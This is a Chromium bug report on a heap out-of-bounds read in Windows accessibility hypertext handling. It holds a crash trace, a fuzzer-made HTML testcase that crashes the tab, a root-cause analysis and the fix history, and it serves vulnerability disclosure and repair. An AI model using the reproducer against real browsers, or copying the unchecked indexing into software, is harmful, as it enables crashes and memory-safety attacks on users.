# chrome!ui::AXPlatformNodeWin::IsSameHypertextCharacter out-of-bounds read

| Field | Value |
|-------|-------|
| **Issue ID** | [40089884](https://issues.chromium.org/issues/40089884) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | Internals>Accessibility, UI>Accessibility |
| **Platforms** | Windows |
| **Reporter** | j0...@gmail.com |
| **Assignee** | ne...@chromium.org |
| **Created** | 2017-12-11 |
| **Bounty** | $500.00 |

## Description

UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36

Steps to reproduce the problem:
+ Page heap turned on for chrome:

C:\Program Files (x86)\Windows Kits\10\Debuggers\x64>gflags.exe /i chrome.exe
Current Registry Settings for chrome.exe executable are: 02109870
    htc - Enable heap tail checking
    hfc - Enable heap free checking
    hpc - Enable heap parameter checking
    htg - Enable heap tagging
    ust - Create user mode stack trace database
    htd - Enable heap tagging by DLL
    scb - Enable system critical breaks
    hpa - Enable page heap

C:\Program Files (x86)\Windows Kits\10\Debuggers\x64>echo %CHROME_ALLOCATOR%
winheap

+ Launch chrome with switches --no-sandbox and --force-renderer-accessibility:

C:\Program Files (x86)\Windows Kits\10\Debuggers\x64>windbg.exe -g -G -o "C:\Users\IEUser\AppData\Local\Google\Chrome SxS\Application\chrome.exe" --no-sandbox --force-renderer-accessibility http://127.0.0.1:8000/2.html

(384c.37e4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
chrome!ui::AXPlatformNodeWin::IsSameHypertextCharacter+0x2f:
00007ffc`49b62731 66423b0443      cmp     ax,word ptr [rbx+r8*2] ds:0000022a`ecb87022=????
0:000> !heap -p -a @rbx
    address 0000022aecb86fe0 found in
    _DPH_HEAP_ROOT @ 22a9ac21000
    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                             22aebc5ddd0:      22aecb86fe0               20 -      22aecb86000             2000
    00007ffc7662345f ntdll!RtlDebugAllocateHeap+0x000000000000003f
    00007ffc765d506c ntdll!RtlpAllocateHeap+0x0000000000089f0c
    00007ffc76548deb ntdll!RtlpAllocateHeapInternal+0x00000000000005cb
    00007ffc484712cb chrome!malloc+0x000000000000001b [C:\b\c\b\win64_clang\src\base\allocator\allocator_shim_override_ucrt_symbols_win.h @ 50]
    00007ffc4aab559f chrome!operator new+0x000000000000001f [f:\dd\vctools\crt\vcstartup\src\heap\new_scalar.cpp @ 19]
    00007ffc48472ad5 +0x00000000000000a9 [c:\b\c\win_toolchain\vs_files\a9e1098bba66d2acccc377d5ee81265910f29272\vc\tools\msvc\14.11.25503\include\xstring @ 3617]
    00007ffc48d2ff44 chrome!content::BrowserAccessibilityComWin::UpdateStep2ComputeHypertext+0x0000000000000078 [C:\b\c\b\win64_clang\src\content\browser\accessibility\browser_accessibility_com_win.cc @ 1809]
    00007ffc48d378a7 chrome!content::BrowserAccessibilityManagerWin::OnAtomicUpdateFinished+0x00000000000000b5 [C:\b\c\b\win64_clang\src\content\browser\accessibility\browser_accessibility_manager_win.cc @ 277]
    00007ffc49b64869 chrome!ui::AXTree::Unserialize+0x00000000000006c9 [C:\b\c\b\win64_clang\src\ui\accessibility\ax_tree.cc @ 384]
    00007ffc48d34d08 chrome!content::BrowserAccessibilityManager::OnAccessibilityEvents+0x00000000000000a0 [C:\b\c\b\win64_clang\src\content\browser\accessibility\browser_accessibility_manager.cc @ 359]
    00007ffc48e6c12f chrome!content::RenderFrameHostImpl::OnAccessibilityEvents+0x0000000000000391 [C:\b\c\b\win64_clang\src\content\browser\frame_host\render_frame_host_impl.cc @ 2487]
    00007ffc48e6bcaa +0x0000000000000096 [C:\b\c\b\win64_clang\src\ipc\ipc_message_templates.h @ 145]
    00007ffc48e668f1 chrome!content::RenderFrameHostImpl::OnMessageReceived+0x00000000000009eb [C:\b\c\b\win64_clang\src\content\browser\frame_host\render_frame_host_impl.cc @ 925]
    00007ffc48f83028 chrome!content::RenderProcessHostImpl::OnMessageReceived+0x0000000000000116 [C:\b\c\b\win64_clang\src\content\browser\renderer_host\render_process_host_impl.cc @ 2924]
    00007ffc494d9237 chrome!IPC::ChannelProxy::Context::OnDispatchMessage+0x0000000000000027 [C:\b\c\b\win64_clang\src\ipc\ipc_channel_proxy.cc @ 320]
    00007ffc484912e7 chrome!base::debug::TaskAnnotator::RunTask+0x00000000000000d7 [C:\b\c\b\win64_clang\src\base\debug\task_annotator.cc @ 53]
    00007ffc48490bcc chrome!base::MessageLoop::RunTask+0x000000000000022c [C:\b\c\b\win64_clang\src\base\message_loop\message_loop.cc @ 391]
    00007ffc484904e7 chrome!base::MessageLoop::DoWork+0x00000000000001a7 [C:\b\c\b\win64_clang\src\base\message_loop\message_loop.cc @ 454]
    00007ffc485a9d5d chrome!base::MessagePumpForUI::DoRunLoop+0x00000000000000ad [C:\b\c\b\win64_clang\src\base\message_loop\message_pump_win.cc @ 174]
    00007ffc484a1065 chrome!base::MessagePumpWin::Run+0x0000000000000065 [C:\b\c\b\win64_clang\src\base\message_loop\message_pump_win.cc @ 58]
    00007ffc4848fec5 chrome!base::RunLoop::Run+0x0000000000000035 [C:\b\c\b\win64_clang\src\base\run_loop.cc @ 130]
    00007ffc4887e1a0 chrome!ChromeBrowserMainParts::MainMessageLoopRun+0x000000000000009c [C:\b\c\b\win64_clang\src\chrome\browser\chrome_browser_main.cc @ 1943]
    00007ffc4887df97 chrome!content::BrowserMainLoop::RunMainMessageLoopParts+0x0000000000000045 [C:\b\c\b\win64_clang\src\content\browser\browser_main_loop.cc @ 1198]
    00007ffc4887df45 chrome!content::BrowserMainRunnerImpl::Run+0x0000000000000011 [C:\b\c\b\win64_clang\src\content\browser\browser_main_runner.cc @ 140]
    00007ffc484887bd chrome!content::BrowserMain+0x00000000000000c3 [C:\b\c\b\win64_clang\src\content\browser\browser_main.cc @ 46]
    00007ffc4848864a chrome!content::RunNamedProcessTypeMain+0x0000000000000117 [C:\b\c\b\win64_clang\src\content\app\content_main_runner.cc @ 427]
    00007ffc484884fa chrome!content::ContentMainRunnerImpl::Run+0x000000000000011e [C:\b\c\b\win64_clang\src\content\app\content_main_runner.cc @ 705]
    00007ffc484757da chrome!service_manager::Main+0x000000000000039a [C:\b\c\b\win64_clang\src\services\service_manager\embedder\main.cc @ 456]
    00007ffc48475370 chrome!content::ContentMain+0x000000000000003e [C:\b\c\b\win64_clang\src\content\app\content_main.cc @ 19]
    00007ffc48471b41 chrome!ChromeMain+0x000000000000012e [C:\b\c\b\win64_clang\src\chrome\app\chrome_main.cc @ 130]
    00007ff6fa90348a chrome_exe!MainDllLoader::Launch+0x000000000000026a [C:\b\c\b\win64_clang\src\chrome\app\main_dll_loader_win.cc @ 199]
    00007ff6fa90169d chrome_exe!wWinMain+0x000000000000069d [C:\b\c\b\win64_clang\src\chrome\app\chrome_exe_main_win.cc @ 230]

0:000> k
 # Child-SP          RetAddr           Call Site
00 00000071`1dffdd40 00007ffc`49b62922 chrome!ui::AXPlatformNodeWin::IsSameHypertextCharacter+0x2f [C:\b\c\b\win64_clang\src\ui\accessibility\platform\ax_platform_node_win.cc @ 4042] 
01 00000071`1dffdd60 00007ffc`48d301eb chrome!ui::AXPlatformNodeWin::ComputeHypertextRemovedAndInserted+0xc0 [C:\b\c\b\win64_clang\src\ui\accessibility\platform\ax_platform_node_win.cc @ 4090] 
02 00000071`1dffde10 00007ffc`48d37900 chrome!content::BrowserAccessibilityComWin::UpdateStep3FireEvents+0x289 [C:\b\c\b\win64_clang\src\content\browser\accessibility\browser_accessibility_com_win.cc @ 1874] 
03 00000071`1dffded0 00007ffc`49b64869 chrome!content::BrowserAccessibilityManagerWin::OnAtomicUpdateFinished+0x10e [C:\b\c\b\win64_clang\src\content\browser\accessibility\browser_accessibility_manager_win.cc @ 293] 
04 00000071`1dffdf20 00007ffc`48d34d08 chrome!ui::AXTree::Unserialize+0x6c9 [C:\b\c\b\win64_clang\src\ui\accessibility\ax_tree.cc @ 384] 
05 00000071`1dffe040 00007ffc`48e6c12f chrome!content::BrowserAccessibilityManager::OnAccessibilityEvents+0xa0 [C:\b\c\b\win64_clang\src\content\browser\accessibility\browser_accessibility_manager.cc @ 359] 
06 00000071`1dffe260 00007ffc`48e6bcaa chrome!content::RenderFrameHostImpl::OnAccessibilityEvents+0x391 [C:\b\c\b\win64_clang\src\content\browser\frame_host\render_frame_host_impl.cc @ 2487] 
07 (Inline Function) --------`-------- chrome!base::DispatchToMethodImpl+0x1f
08 (Inline Function) --------`-------- chrome!base::DispatchToMethod+0x1f
09 (Inline Function) --------`-------- chrome!IPC::DispatchToMethod+0x1f
0a 00000071`1dffe440 00007ffc`48e668f1 chrome!IPC::MessageT<AccessibilityHostMsg_Events_Meta,std::tuple<std::vector<AccessibilityHostMsg_EventParams,std::allocator<AccessibilityHostMsg_EventParams> >,int,int>,void>::Dispatch<content::RenderFrameHostImpl,content::RenderFrameHostImpl,void,void (content::RenderFrameHostImpl::*)(const std::vector<AccessibilityHostMsg_EventParams,std::allocator<AccessibilityHostMsg_EventParams> > &, int, int)>+0x96 [C:\b\c\b\win64_clang\src\ipc\ipc_message_templates.h @ 145] 
0b 00000071`1dffe550 00007ffc`48f83028 chrome!content::RenderFrameHostImpl::OnMessageReceived+0x9eb [C:\b\c\b\win64_clang\src\content\browser\frame_host\render_frame_host_impl.cc @ 925] 
0c 00000071`1dffe8b0 00007ffc`494d9237 chrome!content::RenderProcessHostImpl::OnMessageReceived+0x116 [C:\b\c\b\win64_clang\src\content\browser\renderer_host\render_process_host_impl.cc @ 2924] 
0d 00000071`1dffe970 00007ffc`484912e7 chrome!IPC::ChannelProxy::Context::OnDispatchMessage+0x27 [C:\b\c\b\win64_clang\src\ipc\ipc_channel_proxy.cc @ 320] 
0e (Inline Function) --------`-------- chrome!base::OnceCallback<void ()>::Run+0x16
0f 00000071`1dffe9b0 00007ffc`48490bcc chrome!base::debug::TaskAnnotator::RunTask+0xd7 [C:\b\c\b\win64_clang\src\base\debug\task_annotator.cc @ 53] 
10 00000071`1dffeaf0 00007ffc`484904e7 chrome!base::MessageLoop::RunTask+0x22c [C:\b\c\b\win64_clang\src\base\message_loop\message_loop.cc @ 391] 
11 (Inline Function) --------`-------- chrome!base::MessageLoop::DeferOrRunPendingTask+0x9f
12 00000071`1dffec40 00007ffc`485a9d5d chrome!base::MessageLoop::DoWork+0x1a7 [C:\b\c\b\win64_clang\src\base\message_loop\message_loop.cc @ 454] 
13 00000071`1dffee30 00007ffc`484a1065 chrome!base::MessagePumpForUI::DoRunLoop+0xad [C:\b\c\b\win64_clang\src\base\message_loop\message_pump_win.cc @ 174] 
14 00000071`1dffeee0 00007ffc`4848fec5 chrome!base::MessagePumpWin::Run+0x65 [C:\b\c\b\win64_clang\src\base\message_loop\message_pump_win.cc @ 58] 
15 00000071`1dffef40 00007ffc`4887e1a0 chrome!base::RunLoop::Run+0x35 [C:\b\c\b\win64_clang\src\base\run_loop.cc @ 130] 
16 00000071`1dffef70 00007ffc`4887df97 chrome!ChromeBrowserMainParts::MainMessageLoopRun+0x9c [C:\b\c\b\win64_clang\src\chrome\browser\chrome_browser_main.cc @ 1943] 
17 00000071`1dfff060 00007ffc`4887df45 chrome!content::BrowserMainLoop::RunMainMessageLoopParts+0x45 [C:\b\c\b\win64_clang\src\content\browser\browser_main_loop.cc @ 1198] 
18 00000071`1dfff120 00007ffc`484887bd chrome!content::BrowserMainRunnerImpl::Run+0x11 [C:\b\c\b\win64_clang\src\content\browser\browser_main_runner.cc @ 140] 
19 00000071`1dfff150 00007ffc`4848864a chrome!content::BrowserMain+0xc3 [C:\b\c\b\win64_clang\src\content\browser\browser_main.cc @ 46] 
1a 00000071`1dfff230 00007ffc`484884fa chrome!content::RunNamedProcessTypeMain+0x117 [C:\b\c\b\win64_clang\src\content\app\content_main_runner.cc @ 427] 
1b 00000071`1dfff390 00007ffc`484757da chrome!content::ContentMainRunnerImpl::Run+0x11e [C:\b\c\b\win64_clang\src\content\app\content_main_runner.cc @ 705] 
1c 00000071`1dfff430 00007ffc`48475370 chrome!service_manager::Main+0x39a [C:\b\c\b\win64_clang\src\services\service_manager\embedder\main.cc @ 456] 
1d 00000071`1dfff770 00007ffc`48471b41 chrome!content::ContentMain+0x3e [C:\b\c\b\win64_clang\src\content\app\content_main.cc @ 19] 
1e 00000071`1dfff800 00007ff6`fa90348a chrome!ChromeMain+0x12e [C:\b\c\b\win64_clang\src\chrome\app\chrome_main.cc @ 130] 
1f 00000071`1dfff8d0 00007ff6`fa90169d chrome_exe!MainDllLoader::Launch+0x26a [C:\b\c\b\win64_clang\src\chrome\app\main_dll_loader_win.cc @ 199] 
20 00000071`1dfff9c0 00007ff6`fa9db1e3 chrome_exe!wWinMain+0x69d [C:\b\c\b\win64_clang\src\chrome\app\chrome_exe_main_win.cc @ 230] 
21 (Inline Function) --------`-------- chrome_exe!invoke_main+0x21 [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 118] 
22 00000071`1dfffda0 00007ffc`75121fe4 chrome_exe!__scrt_common_main_seh+0x117 [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 283] 
23 00000071`1dfffde0 00007ffc`7658ef91 KERNEL32!BaseThreadInitThunk+0x14
24 00000071`1dfffe10 00000000`00000000 ntdll!RtlUserThreadStart+0x21

+ Testcase (2.html):

<html>
<head>
<script>
function go() {
document.documentElement.appendChild(document.getElementById("iddir"));
	setTimeout(function(){
		window.location.href = window.location.href;
	}, 1);
}
</script>
</head>
<body onload=go()>
<audio></audio><h3>
<iframe>foo</iframe>
<marquee role="scrollbar" >
<embed style="-webkit-mask-box-image-source: url(#idfoo);" >
<table id = "idtable" controls="controls">aaaaaaaaaaaaaaaaaaaaaaaaaaaaa</table>
<dir id="iddir" tabindex="1">
</dir>
</embed>
<menuitem onclick="foo()" >bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
</body>
</html>

+ Tested on:

OS => Microsoft Windows [Version 10.0.16299.98]
Chrome => Version 65.0.3291.0 (Official Build) canary (64-bit)

OS => Microsoft Windows [Version 6.1.7601]
Chrome => Version 65.0.3291.0 (Official Build) canary (32-bit)

+ Note this bug didn't reproduce in stable channel.
+ This bug was found thanks to Domato: https://github.com/google/domato

What is the expected behavior?
testcase works fine

What went wrong?
tab crash

Did this work before? N/A 

Chrome version: 65.0.3291.0  Channel: canary
OS Version: 10.0
Flash Version:

## Timeline

### el...@chromium.org (2017-12-11)

Can you PTAL and reassign if appropriate?

Unfortunately, upload of the Test Case to ClusterFuzz is broken at the moment.



[Monorail components: UI>Accessibility]

### cl...@chromium.org (2017-12-12)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Internals>Accessibility]

### do...@chromium.org (2017-12-13)

In, AXPlatformNodeWin::ComputeHypertextRemovedAndInserted we calculate the length of the old and new hypertext.  The |new_text| length is calculated from GetText() which usually returns hypertext_.hypertext.  Both string lengths are passed into AXPlatformNodeWin::IsSameHypertextCharacter which indexes the hypertext.  Since new_text's length (from GetText()) is longer than expected, we blow up.

...
  const base::string16& old_text = old_hypertext_.hypertext;
  const base::string16& new_text = GetText();   <-----  this text will be larger than |hypertext_.hypertext|
...
         IsSameHypertextCharacter(old_text.size() - common_suffix - 1,
                                  new_text.size() - common_suffix - 1)) {


bool AXPlatformNodeWin::IsSameHypertextCharacter(size_t old_char_index,
                                                 size_t new_char_index) {

  base::char16 old_ch = old_hypertext_.hypertext[old_char_index];
  base::char16 new_ch = hypertext_.hypertext[new_char_index];   <--- boom


I put a CL up here that tests this approach:  https://chromium-review.googlesource.com/c/chromium/src/+/823257


Nektar, could you take a look at that CL?



### sh...@chromium.org (2017-12-13)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-12-13)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2017-12-13)

[Empty comment from Monorail migration]

### ne...@chromium.org (2017-12-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2017-12-13)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/bc6e40a44b82879aa3449672ae5a4f6f1fd4d667

commit bc6e40a44b82879aa3449672ae5a4f6f1fd4d667
Author: Nektarios Paisios <nektar@chromium.org>
Date: Wed Dec 13 22:28:57 2017

Fixes out of bounds bug in IA2 hypertext

R=dmazzoni@chromium.org, dougt@chromium.org

Bug: 793876
Change-Id: I6bf7e0258aac8dd388e435b7ee123b7ad183c8aa
Reviewed-on: https://chromium-review.googlesource.com/825585
Commit-Queue: Nektarios Paisios <nektar@chromium.org>
Reviewed-by: Nektarios Paisios <nektar@chromium.org>
Reviewed-by: Aaron Leventhal <aleventhal@chromium.org>
Cr-Commit-Position: refs/heads/master@{#523912}
[modify] https://crrev.com/bc6e40a44b82879aa3449672ae5a4f6f1fd4d667/content/test/data/accessibility/event/text-changed-expected-win.txt
[modify] https://crrev.com/bc6e40a44b82879aa3449672ae5a4f6f1fd4d667/content/test/data/accessibility/event/text-changed.html
[modify] https://crrev.com/bc6e40a44b82879aa3449672ae5a4f6f1fd4d667/ui/accessibility/platform/ax_platform_node_win.cc


### ne...@chromium.org (2017-12-13)

[Empty comment from Monorail migration]

### cl...@chromium.org (2017-12-14)

ClusterFuzz has detected this issue as fixed in range 523883:523917.

Detailed report: https://clusterfuzz.com/testcase?key=5622981501124608

Job Type: windows_asan_chrome
Crash Type: Heap-buffer-overflow READ 2
Crash Address: 0x190c9048
Crash State:
  ui::AXPlatformNodeWin::IsSameHypertextCharacter
  ui::AXPlatformNodeWin::ComputeHypertextRemovedAndInserted
  content::BrowserAccessibilityComWin::UpdateStep3FireEvents
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=windows_asan_chrome&range=510178:511643
Fixed: https://clusterfuzz.com/revisions?job=windows_asan_chrome&range=523883:523917

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5622981501124608

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2017-12-14)

ClusterFuzz has detected this issue as fixed in range 523883:523917.

Detailed report: https://clusterfuzz.com/testcase?key=6098619869691904

Job Type: windows_asan_chrome
Crash Type: Heap-buffer-overflow READ 2
Crash Address: 0x1dd91f06
Crash State:
  ui::AXPlatformNodeWin::IsSameHypertextCharacter
  ui::AXPlatformNodeWin::ComputeHypertextRemovedAndInserted
  content::BrowserAccessibilityComWin::UpdateStep3FireEvents
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=windows_asan_chrome&range=510178:511643
Fixed: https://clusterfuzz.com/revisions?job=windows_asan_chrome&range=523883:523917

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6098619869691904

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2017-12-14)

ClusterFuzz testcase 6098619869691904 is verified as fixed, so closing issue as verified.

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### sh...@chromium.org (2017-12-14)

[Empty comment from Monorail migration]

### aw...@google.com (2018-01-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-01-05)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-01-06)

Thanks j00sean.disclosures@ - the VRP panel decided to reward $500 for this report. A member of our finance team will be in touch next week to arrange payment.

### aw...@chromium.org (2018-01-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-02-08)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-02-09)

This bug requires manual review: M65 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), cmasso@(iOS), bhthompson@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2018-02-09)

[Bulk Edit]

+awhalley@ (Security TPM) for M65 merge review

### aw...@google.com (2018-02-09)

govind@ - good for 65

### go...@chromium.org (2018-02-09)

Approving merge to M65 branch 3325 based on https://crbug.com/chromium/793876#c21. Please merge ASAP so we can pick it up for next week Beta release. Thank you.

### sh...@chromium.org (2018-02-12)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2018-02-13)

C listed at #8 is already in M65, no merged is needed. So removing "Merge-Approved-65" label. Thank you

### ne...@chromium.org (2018-02-13)

This should have been merged to 64. Sorry for the mistake.

### go...@chromium.org (2018-02-13)

+abdulsyed@ (M64 Desktop Release TPM)

### ab...@chromium.org (2018-02-13)

awhalley@ - should we consider this for M64? We don't have any respins planned. 

### aw...@google.com (2018-02-13)

We can pick this up in 65.

### aw...@chromium.org (2018-02-16)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-03-22)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-03-27)

[Empty comment from Monorail migration]

### is...@google.com (2018-03-27)

This issue was migrated from crbug.com/chromium/793876?no_tracker_redirect=1

[Multiple monorail components: Internals>Accessibility, UI>Accessibility]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40089884)*
